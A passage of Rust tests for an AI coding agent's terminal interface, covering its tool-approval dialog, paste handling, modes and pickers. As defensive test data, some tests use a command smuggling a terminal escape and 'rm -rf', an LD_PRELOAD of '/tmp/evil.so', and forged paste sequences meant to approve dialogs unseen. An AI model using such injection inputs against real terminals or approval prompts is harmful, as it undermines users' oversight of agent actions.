use super::*;
use synthesis_events::{Event as Ev, ToolStatus};
use synthesis_harness::{ApprovalDecision, ApprovalRequest};
use synthesis_tui_base::keys::{KeyParser, Mods};
use synthesis_tui_base::text::strip_ansi;

const COLS: u32 = 120;
const ROWS: u32 = 40;
const T0: i64 = 1_800_000_000_000;

fn cfg(cwd: &str) -> AppConfig {
    AppConfig {
        cwd: cwd.into(),
        session_id: "sess-1".into(),
        model: "fake/model".into(),
        version: "0.1".into(),
        budget: Budget::default(),
        sandbox: SandboxStatus::default(),
        mode: Mode::Default,
        models: vec!["fake/a".into(), "fake/b".into()],
        effort_tiers: vec!["low".into(), "medium".into(), "high".into()],
        context_window: None,
        extra_commands: vec![],
        saved: vec![SavedSession {
            id: "abcdef123456".into(),
            cwd: "/work/other".into(),
            title: "older".into(),
            updated_at: "2026-01-01T00:00:00Z".into(),
            mtime: 1,
        }],
        home: None,
        mouse_debug: false,
        tz_offset_min: 0,
        project_trusted: true,
        plain_logo: false,
        agent_defs: vec!["reviewer".into()],
    }
}

fn app() -> App {
    App::new(cfg("/tmp/proj"), &[], T0)
}

fn keys(app: &mut App, bytes: &str) -> Vec<Cmd> {
    let mut p = KeyParser::default();
    let mut out = vec![];
    for k in p.feed(bytes.as_bytes()) {
        out.extend(app.on_key(k, T0));
    }
    out
}

fn screen(app: &mut App) -> String {
    screen_at(app, T0)
}

fn screen_at(app: &mut App, now: i64) -> String {
    app.render(COLS, ROWS, now)
        .iter()
        .map(|l| strip_ansi(l).trim_end().to_string())
        .collect::<Vec<_>>()
        .join("\n")
}

fn env(seq: u64, ev: Ev) -> Envelope {
    Envelope {
        v: 1,
        seq,
        ts: "2026-01-01T00:00:00.000Z".into(),
        session_id: "sess-1".into(),
        task_id: Some("t1".into()),
        turn_id: None,
        agent_id: None,
        event: ev,
    }
}

fn ask(
    tool: &str,
    input: Value,
    suggestions: Vec<Suggestion>,
) -> (ApprovalAsk, oneshot::Receiver<Approval>) {
    let (tx, rx) = oneshot::channel();
    (
        ApprovalAsk {
            req: ApprovalRequest {
                approval_id: "ap1".into(),
                agent_id: None,
                tool_call_id: "tc1".into(),
                tool: tool.into(),
                input,
                dialog: "permission",
                prompt: "p".into(),
                reason: "needs approval".into(),
                suggestions,
                origin: None,
            },
            reply: tx,
            deadline_ms: None,
        },
        rx,
    )
}

#[test]
fn typing_and_submit_starts_a_task_and_enter_while_busy_queues_in_order() {
    let mut a = app();
    keys(&mut a, "hello world");
    let cmds = keys(&mut a, "\r");
    assert!(matches!(&cmds[..], [Cmd::StartTask { text, .. }] if text == "hello world"));
    assert!(a.running());
    // a line typed to the running main agent goes to its inbox (next tool round)
    let cmds = keys(&mut a, "again\r");
    assert!(matches!(&cmds[..], [Cmd::SendTo { to, text }] if to == "main" && text == "again"));
    keys(&mut a, "!");
    keys(&mut a, "echo hi\r");
    assert_eq!(a.queue, ["!echo hi"], "a shell line waits for the task");
    assert_eq!(a.editor.text(), "");
    let s = screen(&mut a);
    assert!(s.contains("⧗ queued: !echo hi"), "{s}");
    assert!(a.next_queued(T0).is_empty(), "still running");
    // the turn ends: the queued line starts
    a.task_done(&Err("done".into()), T0);
    let cmds = a.next_queued(T0);
    assert!(
        matches!(&cmds[..], [Cmd::UserCommand { command, record_only: false, .. }] if command == "echo hi")
    );
    assert!(a.queue.is_empty());
}

#[test]
fn up_recalls_a_queued_line_and_esc_cancels_the_queue_before_the_task() {
    let mut a = app();
    keys(&mut a, "go\r");
    a.queue = vec!["one".into(), "two".into()];
    keys(&mut a, "\x1b[A");
    assert_eq!((a.editor.text().as_str(), a.queue.len()), ("two", 1));
    a.editor.submit();
    a.queue.push("two".into());
    assert_eq!(a.queue, ["one", "two"]);
    let token = a.task.as_ref().unwrap().cancel.clone();
    keys(&mut a, "\x1b");
    assert!(!token.is_cancelled(), "first esc only drops the queue");
    assert!(a.queue.is_empty());
    assert_eq!(a.editor.text(), "one\ntwo", "nothing typed is lost");
    keys(&mut a, "\x1b");
    assert!(a.task.as_ref().unwrap().cancel.is_cancelled());
}

#[test]
fn esc_esc_on_an_idle_empty_prompt_edits_the_last_prompt() {
    let mut a = app();
    keys(&mut a, "first\r");
    a.task_done(&Err("done".into()), T0);
    keys(&mut a, "\x1b");
    assert_eq!(a.editor.text(), "");
    keys(&mut a, "\x1b");
    assert_eq!(a.editor.text(), "first");
}

#[test]
fn esc_cancels_then_ctrl_c_quits_and_idle_ctrl_c_needs_two_presses() {
    let mut a = app();
    keys(&mut a, "go\r");
    let token = a.task.as_ref().unwrap().cancel.clone();
    keys(&mut a, "\x1b");
    assert!(token.is_cancelled());
    assert!(a.quit.is_none(), "esc only cancels");
    assert!(a.chat.agent.interrupting);
    keys(&mut a, "\x03");
    assert_eq!(
        a.quit,
        Some(ExitReason::Quit),
        "second interrupt while winding down quits"
    );

    let mut b = app();
    keys(&mut b, "\x03");
    assert!(b.quit.is_none());
    assert!(screen(&mut b).contains("press ctrl+c again to quit"));
    keys(&mut b, "\x03");
    assert_eq!(b.quit, Some(ExitReason::Quit));

    // ctrl+c with text only clears the prompt
    let mut c = app();
    keys(&mut c, "draft\x03");
    assert_eq!(c.editor.text(), "");
    assert!(c.quit.is_none());
}

#[test]
fn multiline_paste_and_backslash_enter() {
    let mut a = app();
    keys(&mut a, "\x1b[200~one\ntwo\x1b[201~");
    assert_eq!(a.editor.text(), "one\ntwo");
    keys(&mut a, "\\\r");
    assert_eq!(a.editor.text(), "one\ntwo\n");
    let s = screen(&mut a);
    assert!(s.contains("one") && s.contains("two"), "{s}");
    // enter on text without a trailing backslash submits the whole block
    keys(&mut a, "three");
    let cmds = keys(&mut a, "\r");
    assert!(matches!(&cmds[..], [Cmd::StartTask { text, .. }] if text == "one\ntwo\nthree"));
}

#[test]
fn approval_dialog_allow_deny_always_and_display_is_sanitized() {
    let mut a = app();
    let input = json!({"command": "echo \x1b[31mred\x1b]0;pwn\x07 && rm -rf /tmp/x"});
    let sugg = vec![Suggestion::SetMode(Mode::AcceptEdits)];
    let (q, mut rx) = ask("Bash", input, sugg.clone());
    a.on_approval(q, T0 - ARM_MS);
    let lines = a.render(COLS, ROWS, T0 - ARM_MS);
    let raw = lines.join("\n");
    assert!(
        !raw.contains("\x1b]0;"),
        "no OSC from tool input reaches the terminal"
    );
    let s = screen(&mut a);
    assert!(s.contains("Do you want to proceed?"), "{s}");
    assert!(
        s.contains("echo \\u{1b}[31mred\\u{1b}]0;pwn\\u{7} && rm -rf /tmp/x"),
        "every byte of the command is shown, escapes made visible: {s}"
    );
    assert!(
        s.contains("Yes, allow all edits during this session"),
        "{s}"
    );
    assert!(s.contains("1. Yes") && s.contains("3. No"), "{s}");

    keys(&mut a, "1");
    assert_eq!(rx.try_recv().unwrap().decision, ApprovalDecision::Allow);

    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), sugg.clone());
    a.on_approval(q, T0 - ARM_MS);
    keys(&mut a, "\x1b[B\r"); // down, enter: allow always
    let r = rx.try_recv().unwrap();
    assert_eq!(r.decision, ApprovalDecision::Allow);
    assert_eq!(r.accepted, sugg, "only the offered suggestion is accepted");

    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(q, T0 - ARM_MS);
    keys(&mut a, "\x1b"); // esc
    let r = rx.try_recv().unwrap();
    assert_eq!(r.decision, ApprovalDecision::Deny);
    assert_eq!(r.message.as_deref(), Some(DENY_MESSAGE));
    assert!(a.dialogs.is_empty());
}

#[test]
fn approvals_queue_and_withdraw_removes_the_right_one() {
    let mut a = app();
    let (q1, _r1) = ask("Bash", json!({"command": "one"}), vec![]);
    let (mut q2, _r2) = ask("Bash", json!({"command": "two"}), vec![]);
    q2.req.approval_id = "ap2".into();
    a.on_approval(q1, T0);
    a.on_approval(q2, T0);
    assert!(screen(&mut a).contains("one"));
    a.on_withdraw("ap1", T0);
    let s = screen(&mut a);
    assert!(s.contains("two") && !s.contains("echo one"), "{s}");
    assert!(
        s.contains("withdrawn"),
        "the user is told why the dialog vanished: {s}"
    );
}

#[test]
fn countdown_is_shown_for_an_expiring_approval() {
    let mut a = app();
    let (mut q, _r) = ask("Bash", json!({"command": "ls"}), vec![]);
    q.deadline_ms = Some(T0 + 61_000);
    a.on_approval(q, T0);
    assert!(screen(&mut a).contains("expires unanswered in 1:01"));
}

fn key_at(app: &mut App, bytes: &str, now: i64) -> Vec<Cmd> {
    let mut p = KeyParser::default();
    p.feed(bytes.as_bytes())
        .into_iter()
        .flat_map(|k| app.on_key(k, now))
        .collect()
}

#[test]
fn an_approval_for_another_session_says_whose_work_it_is() {
    let mut a = app();
    let (mut q, _rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    q.req.origin = Some("sess:other".into());
    a.on_approval(q, T0);
    let s = screen(&mut a);
    assert!(s.contains("for sess:other: needs approval"), "{s}");
}

#[test]
fn approval_ignores_enter_and_digits_while_arming_but_esc_cancels() {
    let mut a = app();
    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(q, T0);
    assert!(screen(&mut a).contains("wait…"));
    key_at(&mut a, "\r", T0 + 10);
    key_at(&mut a, "1", T0 + 20);
    assert!(rx.try_recv().is_err(), "typed-ahead keys must not approve");
    assert_eq!(a.dialogs.len(), 1);
    key_at(&mut a, "\r", T0 + ARM_MS + 1);
    assert_eq!(rx.try_recv().unwrap().decision, ApprovalDecision::Allow);

    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(q, T0 + 1000);
    key_at(&mut a, "\x1b", T0 + 1001);
    assert_eq!(rx.try_recv().unwrap().decision, ApprovalDecision::Deny);
}

/// The screen with everything but letters and digits removed: a wrapped token still matches.
fn flat(a: &mut App) -> String {
    screen(a).chars().filter(|c| c.is_alphanumeric()).collect()
}

fn open_dialog(tool: &str, input: Value) -> (App, oneshot::Receiver<Approval>) {
    let mut a = app();
    let (q, rx) = ask(tool, input, vec![]);
    a.on_approval(q, T0 - ARM_MS);
    (a, rx)
}

#[test]
fn long_sanitised_input_is_never_cut_silently_and_x_shows_it_all() {
    // raw JSON is 396 chars (under the 400 warning); each ESC is 6 raw but 7 once sanitised
    // and JSON-quoted, so the tail sits past the 400 the dialog shows
    let v = format!("{}{}TAILMARK", "a".repeat(20), "\x1b".repeat(60));
    let input = json!({ "k": v });
    assert!(input.to_string().chars().count() < 400);
    let (mut a, _rx) = open_dialog("mcp__srv__tool", input);
    let s = screen(&mut a);
    assert!(
        s.contains("more chars hidden — press x to view all]"),
        "explicit marker, not a bare ellipsis: {s}"
    );
    assert!(!flat(&mut a).contains("TAILMARK"));
    keys(&mut a, "x");
    assert!(flat(&mut a).contains("TAILMARK"), "x shows the whole input");
    assert!(screen(&mut a).contains("x to collapse]"));
    keys(&mut a, "x");
    assert!(!flat(&mut a).contains("TAILMARK"));
}

#[test]
fn blank_glyph_runs_cannot_push_a_tail_out_of_view() {
    // one long NBSP run collapses, so the tail stays inside the first 400 chars
    let (mut a, _rx) = open_dialog(
        "mcp__srv__tool",
        json!({ "k": format!("ok{}TAILMARK", "\u{a0}".repeat(500)) }),
    );
    let s = screen(&mut a);
    assert!(
        s.contains("[500 spaces]") && flat(&mut a).contains("TAILMARK"),
        "{s}"
    );
    // runs just under the collapse threshold, repeated: escaped visibly, tail beyond 400 is flagged
    let v = format!("{}TAILMARK", "\u{a0}\u{a0}\u{a0}\u{a0}\u{a0}b".repeat(30));
    let (mut a, _rx) = open_dialog("mcp__srv__tool", json!({ "k": v }));
    let s = screen(&mut a);
    assert!(s.contains("\\\\u{a0}") || s.contains("\\u{a0}"), "{s}");
    assert!(s.contains("more chars hidden"), "{s}");
    assert!(!flat(&mut a).contains("TAILMARK"));
}

#[test]
fn command_tools_show_the_whole_command_and_the_other_fields() {
    for tool in ["verify_run", "terminal_spawn"] {
        let cmd = format!("{} && echo TAILMARK", "x ".repeat(400));
        let (mut a, _rx) = open_dialog(
            tool,
            json!({"command": cmd, "cwd": "/w", "env": {"LD_PRELOAD": "/tmp/evil.so"}}),
        );
        let f = flat(&mut a);
        assert!(f.contains("TAILMARK"), "{tool}: full command");
        assert!(
            f.contains("LDPRELOAD") && f.contains("evilso"),
            "{tool}: env shown"
        );
        assert!(!screen(&mut a).contains("more chars hidden"), "{tool}");
    }
}

#[test]
fn view_all_scrolls_with_page_keys() {
    let words: String = (0..600).map(|i| format!("w{i} ")).collect();
    let (mut a, _rx) = open_dialog("mcp__srv__tool", json!({ "k": format!("{words}ENDMARK") }));
    keys(&mut a, "x");
    assert!(flat(&mut a).contains("w0w1") && !flat(&mut a).contains("ENDMARK"));
    for _ in 0..40 {
        keys(&mut a, "\x1b[6~");
    }
    assert!(flat(&mut a).contains("ENDMARK"), "{}", screen(&mut a));
    for _ in 0..80 {
        keys(&mut a, "\x1b[5~");
    }
    assert!(flat(&mut a).contains("w0w1"));
}

/// What the runtime does for one read: parse, tell the app about paste activity, deliver keys.
fn read_at(app: &mut App, p: &mut KeyParser, bytes: &str, now: i64) {
    let ks = p.feed_at(bytes.as_bytes(), now);
    if p.state.take_paste_activity() {
        app.paste_activity(now);
    }
    for k in ks {
        app.on_key(k, now);
    }
}

#[test]
fn late_chunk_after_a_forged_paste_end_cannot_answer_an_armed_dialog() {
    let mut a = app();
    let mut p = KeyParser::default();
    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(q, T0 - 10 * ARM_MS); // long since armed by its own timer
    read_at(&mut a, &mut p, "\x1b[200~echo hi\x1b[201~", T0);
    // the rest of the payload, after the parser's 50 ms grace: Enter and digits
    read_at(&mut a, &mut p, "\r1\r1\r", T0 + 80);
    assert!(rx.try_recv().is_err(), "paste tail must not answer");
    assert!(screen_at(&mut a, T0 + 80).contains("wait…"));
    assert_eq!(a.dialogs.len(), 1);
    // quiet for PASTE_QUIET_MS after the last paste activity: armed again
    // (the multi-line tail was itself taken for a paste at T0 + 80, so quiet runs from there)
    read_at(&mut a, &mut p, "\r", T0 + 80 + PASTE_QUIET_MS - 1);
    assert!(rx.try_recv().is_err());
    read_at(&mut a, &mut p, "\r", T0 + 80 + PASTE_QUIET_MS + 1);
    assert_eq!(rx.try_recv().unwrap().decision, ApprovalDecision::Allow);
}

#[test]
fn every_kind_of_paste_activity_keeps_a_dialog_unarmed_but_esc_and_ctrl_c_work() {
    for (bytes, then) in [
        ("\x1b[200~still pasting", "1"), // paste start, no end marker
        ("\x1bPheld", "\r"),             // held escape string
    ] {
        let mut a = app();
        let mut p = KeyParser::default();
        let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
        a.on_approval(q, T0 - 10 * ARM_MS);
        read_at(&mut a, &mut p, bytes, T0);
        read_at(&mut a, &mut p, then, T0 + 10);
        assert!(rx.try_recv().is_err(), "{bytes:?}");
        key_at(&mut a, "\x1b", T0 + 20);
        assert_eq!(
            rx.try_recv().unwrap().decision,
            ApprovalDecision::Deny,
            "{bytes:?}"
        );
    }
    let mut a = app();
    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(q, T0 - 10 * ARM_MS);
    a.on_key(Key::Paste("x".into()), T0);
    key_at(&mut a, "\r", T0 + 5);
    assert!(rx.try_recv().is_err());
    key_at(&mut a, "\x03", T0 + 6);
    assert_eq!(rx.try_recv().unwrap().decision, ApprovalDecision::Deny);
}

#[test]
fn queued_approval_does_not_inherit_the_keys_that_answered_the_first() {
    let mut a = app();
    let (q1, mut r1) = ask("Bash", json!({"command": "one"}), vec![]);
    let (mut q2, mut r2) = ask("Bash", json!({"command": "two"}), vec![]);
    q2.req.approval_id = "ap2".into();
    a.on_approval(q1, T0 - ARM_MS);
    a.on_approval(q2, T0 - ARM_MS);
    // two Enters arrive in one burst: the first answers one, the second must not answer two
    key_at(&mut a, "\r\r", T0);
    assert_eq!(r1.try_recv().unwrap().decision, ApprovalDecision::Allow);
    assert!(r2.try_recv().is_err());
    assert!(screen(&mut a).contains("wait…"));
    key_at(&mut a, "\r", T0 + ARM_MS + 1);
    assert_eq!(r2.try_recv().unwrap().decision, ApprovalDecision::Allow);
}

fn question(multi: bool) -> NeedsUser {
    NeedsUser::AskUserQuestion {
        questions: vec![synthesis_tools::Question {
            question: "Which db?".into(),
            header: Some("DB".into()),
            multi_select: multi,
            options: vec![
                synthesis_tools::QuestionOption {
                    label: "pg".into(),
                    description: None,
                },
                synthesis_tools::QuestionOption {
                    label: "sqlite".into(),
                    description: Some("embedded".into()),
                },
            ],
        }],
    }
}

fn input_ask(req: NeedsUser) -> (InputAsk, oneshot::Receiver<Option<UserReply>>) {
    let (tx, rx) = oneshot::channel();
    (
        InputAsk {
            id: "q1".into(),
            req,
            reply: tx,
        },
        rx,
    )
}

#[test]
fn question_dialog_single_multi_other_and_decline() {
    let mut a = app();
    let (q, mut rx) = input_ask(question(false));
    a.on_input(q, T0);
    assert!(screen(&mut a).contains("Which db?"));
    keys(&mut a, "2"); // digit picks and answers
    match rx.try_recv().unwrap() {
        Some(UserReply::Answers(v)) => assert_eq!(v, json!({"Which db?": "sqlite"})),
        o => panic!("{o:?}"),
    }

    let (q, mut rx) = input_ask(question(true));
    a.on_input(q, T0);
    keys(&mut a, "1 \r"); // toggle pg, then space/enter on the second? keep simple:
    // 1 toggles pg; space toggles the current choice (pg again, now off); enter submits
    let _ = rx.try_recv();

    let (q, mut rx) = input_ask(question(false));
    a.on_input(q, T0);
    keys(&mut a, "3"); // Other
    keys(&mut a, "mongo\r");
    match rx.try_recv().unwrap() {
        Some(UserReply::Answers(v)) => assert_eq!(v, json!({"Which db?": "mongo"})),
        o => panic!("{o:?}"),
    }

    let (q, mut rx) = input_ask(question(false));
    a.on_input(q, T0);
    keys(&mut a, "\x1b");
    match rx.try_recv().unwrap() {
        Some(UserReply::Answers(v)) => {
            assert_eq!(v, json!({"Which db?": "The user declined to answer."}))
        }
        o => panic!("{o:?}"),
    }
}

#[test]
fn multi_select_collects_labels_in_order() {
    let mut a = app();
    let (q, mut rx) = input_ask(question(true));
    a.on_input(q, T0);
    keys(&mut a, "1"); // toggle pg
    keys(&mut a, "\x1b[B"); // move to sqlite
    keys(&mut a, " "); // toggle sqlite
    keys(&mut a, "\r"); // submit
    match rx.try_recv().unwrap() {
        Some(UserReply::Answers(v)) => assert_eq!(v, json!({"Which db?": "pg, sqlite"})),
        o => panic!("{o:?}"),
    }
}

#[test]
fn plan_dialog_maps_choices_to_modes() {
    let mut a = app();
    let (q, mut rx) = input_ask(NeedsUser::ExitPlanMode {
        plan: "# Plan\n- step".into(),
    });
    a.on_input(q, T0 - ARM_MS);
    let s = screen(&mut a);
    assert!(
        s.contains("Would you like to proceed?") && s.contains("step"),
        "{s}"
    );
    keys(&mut a, "2");
    match rx.try_recv().unwrap() {
        Some(UserReply::Plan { approved, mode, .. }) => {
            assert!(approved);
            assert_eq!(mode, Some(Mode::AcceptEdits));
        }
        o => panic!("{o:?}"),
    }
    assert_eq!(a.mode, Mode::AcceptEdits);

    let (q, mut rx) = input_ask(NeedsUser::ExitPlanMode { plan: "p".into() });
    a.on_input(q, T0 - ARM_MS);
    keys(&mut a, "\x1b");
    match rx.try_recv().unwrap() {
        Some(UserReply::Plan {
            approved, message, ..
        }) => assert!(!approved && message.is_some()),
        o => panic!("{o:?}"),
    }
}

#[test]
fn slash_commands_pickers_and_unknowns() {
    let mut a = app();
    keys(&mut a, "/help\r");
    assert!(screen(&mut a).contains("Commands & keys"));

    keys(&mut a, "/nope\r");
    assert!(screen(&mut a).contains("unknown command: /nope"));

    // /mode is gone: Shift+Tab is the only way to switch
    keys(&mut a, "/mode plan\r");
    assert!(screen(&mut a).contains("unknown command: /mode"));
    assert_eq!(a.mode, Mode::Default);
    assert!(!a.commands.iter().any(|c| c.name == "mode"));
    let cycle = [Mode::AcceptEdits, Mode::Plan, Mode::Auto];
    for m in cycle {
        keys(&mut a, "\x1b[Z");
        assert_eq!(a.mode, m);
    }
    // bypass opens its dialog; Esc stays in auto, "No" is the default, yes switches
    keys(&mut a, "\x1b[Z");
    assert_eq!(a.mode, Mode::Auto);
    assert!(screen(&mut a).contains("Bypass permissions?"));
    keys(&mut a, "\x1b");
    assert_eq!(a.mode, Mode::Auto);
    keys(&mut a, "\x1b[Z\r");
    assert_eq!(a.mode, Mode::Auto);
    let cmds = {
        keys(&mut a, "\x1b[Z\x1b[B");
        keys(&mut a, "\r")
    };
    assert_eq!(a.mode, Mode::BypassPermissions);
    assert!(matches!(
        &cmds[..],
        [Cmd::SetMode {
            mode: Mode::BypassPermissions,
            confirmed_bypass: true
        }]
    ));
    keys(&mut a, "\x1b[Z");
    assert_eq!(a.mode, Mode::Default);

    // model picker -> choose second entry
    keys(&mut a, "/model\r");
    assert!(screen(&mut a).contains("fake/b"));
    keys(&mut a, "\x1b[B");
    let cmds = keys(&mut a, "\r");
    assert!(matches!(&cmds[..], [Cmd::SwitchModel(m)] if m == "fake/b"));
    a.model_switched("fake/b");
    assert!(screen(&mut a).contains("fake/b"));

    // resume picker -> quits with the chosen id
    keys(&mut a, "/resume\r");
    assert!(screen(&mut a).contains("abcdef12"));
    keys(&mut a, "\r");
    assert_eq!(a.quit, Some(ExitReason::Resume("abcdef123456".into())));
}

#[test]
fn picker_filters_and_escape_closes() {
    let mut a = app();
    keys(&mut a, "\x10"); // ctrl+p: command palette
    assert!(screen(&mut a).contains("/resume"));
    keys(&mut a, "/status");
    let p = a.picker.as_ref().unwrap();
    assert_eq!(p.picker.filtered().len(), 1);
    keys(&mut a, "\x1b");
    assert!(a.picker.is_none());
    keys(&mut a, "\x10");
    keys(&mut a, "/status");
    keys(&mut a, "\r");
    assert!(screen(&mut a).contains("verification"), "ran /status");
}

#[test]
fn folder_picker_navigates_and_returns_the_chosen_folder() {
    let d = tempfile::tempdir().unwrap();
    let root = std::fs::canonicalize(d.path()).unwrap();
    std::fs::create_dir_all(root.join("alpha/inner")).unwrap();
    std::fs::create_dir_all(root.join("beta")).unwrap();
    std::fs::create_dir_all(root.join(".hidden")).unwrap();
    let mut a = App::new(cfg(&root.to_string_lossy()), &[], T0);
    keys(&mut a, "\x0e"); // ctrl+n
    let s = screen(&mut a);
    assert!(
        s.contains("alpha/") && s.contains("beta/") && !s.contains(".hidden"),
        "{s}"
    );
    keys(&mut a, "\x1b[B\x1b[B");
    keys(&mut a, "\r"); // use, .., alpha/: descend
    assert!(screen(&mut a).contains("inner/"));
    keys(&mut a, "\r"); // first entry: use this folder
    assert_eq!(a.quit, Some(ExitReason::OpenFolder(root.join("alpha"))));
}

#[test]
fn at_file_completion_and_slash_completion() {
    let d = tempfile::tempdir().unwrap();
    let root = std::fs::canonicalize(d.path()).unwrap();
    std::fs::write(root.join("notes.md"), "x").unwrap();
    let mut a = App::new(cfg(&root.to_string_lossy()), &[], T0);
    keys(&mut a, "see @not");
    assert!(screen(&mut a).contains("notes.md"));
    keys(&mut a, "\t");
    assert_eq!(a.editor.text(), "see @notes.md ");
    a.editor.clear();
    keys(&mut a, "/he");
    assert!(screen(&mut a).contains("/help"));
    // enter on a complete, argument-less command runs it at once
    keys(&mut a, "\r");
    assert!(screen(&mut a).contains("Commands & keys"));
}

#[test]
fn history_recall_and_ctrl_r_search() {
    let mut a = app();
    for t in ["alpha one", "beta two", "alpha three"] {
        keys(&mut a, t);
        a.editor.submit(); // as the runtime would after the task started
    }
    keys(&mut a, "\x1b[A");
    assert_eq!(a.editor.text(), "alpha three");
    a.editor.clear();
    keys(&mut a, "\x12alpha");
    assert!(screen(&mut a).contains("alpha three"));
    keys(&mut a, "\x12"); // next older match
    keys(&mut a, "\r");
    assert_eq!(a.editor.text(), "alpha one");
    keys(&mut a, "\x12");
    keys(&mut a, "\x1b");
    assert!(a.search.is_none());
}

#[test]
fn mode_cycle_and_status_line_facts() {
    let mut a = app();
    keys(&mut a, "\x1b[Z");
    assert_eq!(a.mode, Mode::AcceptEdits);
    keys(&mut a, "\x1b[Z");
    assert_eq!(a.mode, Mode::Plan);
    keys(&mut a, "\x1b[Z");
    assert_eq!(a.mode, Mode::Auto);
    keys(&mut a, "\x1b[Z\x1b[B\r"); // bypass dialog: Yes
    assert_eq!(a.mode, Mode::BypassPermissions);
    keys(&mut a, "\x1b[Z");
    assert_eq!(a.mode, Mode::Default);
    let s = screen(&mut a);
    let last = s.lines().last().unwrap();
    assert!(
        last.contains("sandbox: unknown") && last.contains("verify n/a"),
        "{last}"
    );
}

fn streamed(a: &mut App) {
    let evs = [
        Ev::TaskStarted {
            request: "hi".into(),
            acceptance_criteria: vec![],
            budget: Budget::default(),
        },
        Ev::UserMessage {
            text: "hi".into(),
            display_text: None,
            images: vec![],
        },
        Ev::TurnStarted {
            model: "m".into(),
            provider: "p".into(),
            iteration: 1,
        },
        Ev::ModelDelta {
            block_index: 0,
            kind: "text".into(),
            text: "The answer ".into(),
        },
        Ev::ModelDelta {
            block_index: 0,
            kind: "text".into(),
            text: "is 42".into(),
        },
        Ev::ToolRequested {
            tool_call_id: "c1".into(),
            name: "Read".into(),
            input: json!({"file_path": "/tmp/a.txt"}),
            input_truncated: false,
            origin: None,
        },
        Ev::ToolCompleted {
            tool_call_id: "c1".into(),
            name: "Read".into(),
            status: ToolStatus::Ok,
            is_error: false,
            not_run: false,
            duration_ms: 3,
            preview: "file text".into(),
            bytes: 9,
            truncated: false,
            result_ref: None,
            origin: None,
            output: Some("file text".into()),
            output_truncated: false,
            output_bytes: 9,
            diff: None,
        },
    ];
    for (i, e) in evs.into_iter().enumerate() {
        a.on_event(&env(i as u64 + 1, e), T0);
    }
}

#[test]
fn events_become_conversation_rows_and_failed_tasks_are_not_success() {
    let mut a = app();
    streamed(&mut a);
    let s = screen(&mut a);
    assert!(s.contains("> hi") && s.contains("The answer is 42"), "{s}");
    assert!(s.contains("Read(") && s.contains("read 1 lines"), "{s}");
    assert!(a.chat.agent.status == "running");
    a.on_event(
        &env(
            9,
            Ev::TaskEnded {
                status: synthesis_events::TaskStatus::Unverified,
                reason: "no_verification".into(),
                verification_report_id: None,
                usage: synthesis_events::Usage {
                    input_tokens: 0,
                    output_tokens: 0,
                    cache_read_input_tokens: None,
                    cache_creation_input_tokens: None,
                    cost_usd: None,
                },
                changed_files: vec![],
                artifacts_root: String::new(),
                needed_permissions: vec![],
            },
        ),
        T0 + 1000,
    );
    let s = screen(&mut a);
    assert!(s.contains("task unverified: no_verification"), "{s}");
    assert!(
        !s.contains("Done"),
        "unverified is never shown as done: {s}"
    );
    assert!(
        s.lines().last().unwrap().contains("verify unverified"),
        "{s}"
    );
}

#[test]
fn rows_of_a_streaming_item_are_not_stale() {
    // the renderer caches rows per item: a growing text item must show every delta
    let mut a = app();
    streamed(&mut a);
    for (i, t) in [" and more", " still more"].iter().enumerate() {
        a.on_event(
            &env(
                20 + i as u64,
                Ev::ModelDelta {
                    block_index: 0,
                    kind: "text".into(),
                    text: (*t).into(),
                },
            ),
            T0,
        );
        assert!(screen(&mut a).contains(t.trim()), "delta {i} missing");
    }
}

#[test]
fn too_small_terminal_shows_a_message_not_garbage() {
    let mut a = app();
    let l = a.render(40, 10, T0);
    assert_eq!(l.len(), 10);
    assert!(l.iter().any(|x| x.contains("terminal too small")));
}

#[test]
fn selection_drag_copies_chat_text() {
    let mut a = app();
    streamed(&mut a);
    let lines = a.render(COLS, ROWS, T0);
    let row = lines
        .iter()
        .position(|l| strip_ansi(l).contains("The answer is 42"))
        .unwrap();
    let plain = strip_ansi(&lines[row]);
    let col = plain[..plain.find("The answer").unwrap()].chars().count();
    let m = Mods::default();
    let down = Key::Mouse {
        x: col as u32 + 1,
        y: row as u32 + 1,
        button: 0,
        action: MouseAction::Down,
        mods: m,
    };
    let drag = Key::MouseDrag {
        x: col as u32 + 1 + 16,
        y: row as u32 + 1,
        button: 0,
        mods: m,
    };
    let up = Key::Mouse {
        x: col as u32 + 1 + 16,
        y: row as u32 + 1,
        button: 0,
        action: MouseAction::Up,
        mods: m,
    };
    assert!(a.on_key(down, T0).is_empty());
    a.on_key(drag, T0);
    let cmds = a.on_key(up, T0);
    match &cmds[..] {
        [Cmd::Copy(t)] => assert_eq!(t, "The answer is 42"),
        o => panic!("{o:?}"),
    }
    // the highlight is painted until something clears it
    let hl = a.render(COLS, ROWS, T0).join("\n");
    assert!(hl.contains("\x1b[48;2;70;60;50m"));
    keys(&mut a, "x");
    assert!(
        !a.render(COLS, ROWS, T0)
            .join("\n")
            .contains("\x1b[48;2;70;60;50m")
    );
    // a click without a drag copies nothing
    let click_up = Key::Mouse {
        x: col as u32 + 1,
        y: row as u32 + 1,
        button: 0,
        action: MouseAction::Up,
        mods: m,
    };
    a.on_key(
        Key::Mouse {
            x: col as u32 + 1,
            y: row as u32 + 1,
            button: 0,
            action: MouseAction::Down,
            mods: m,
        },
        T0,
    );
    assert!(a.on_key(click_up, T0).is_empty());
}

/// Screen cell (0-based column, row) of the first `needle` after `skip` chars, in the rendered frame.
fn find_cell(a: &mut App, needle: &str, skip: usize) -> (u32, u32) {
    let lines = a.render(COLS, ROWS, T0);
    for (y, l) in lines.iter().enumerate() {
        let plain = strip_ansi(l);
        if let Some(i) = plain.find(needle) {
            return (plain[..i].chars().count() as u32 + skip as u32, y as u32);
        }
    }
    panic!("{needle:?} not on screen");
}

fn click(a: &mut App, x: u32, y: u32, action: MouseAction, now: i64) -> Vec<Cmd> {
    a.on_key(
        Key::Mouse {
            x: x + 1,
            y: y + 1,
            button: 0,
            action,
            mods: Mods::default(),
        },
        now,
    )
}

/// Press at `from`, drag to `to`, release; returns what the release asked for.
fn drag(a: &mut App, from: (u32, u32), to: (u32, u32)) -> Vec<Cmd> {
    click(a, from.0, from.1, MouseAction::Down, T0);
    a.on_key(
        Key::MouseDrag {
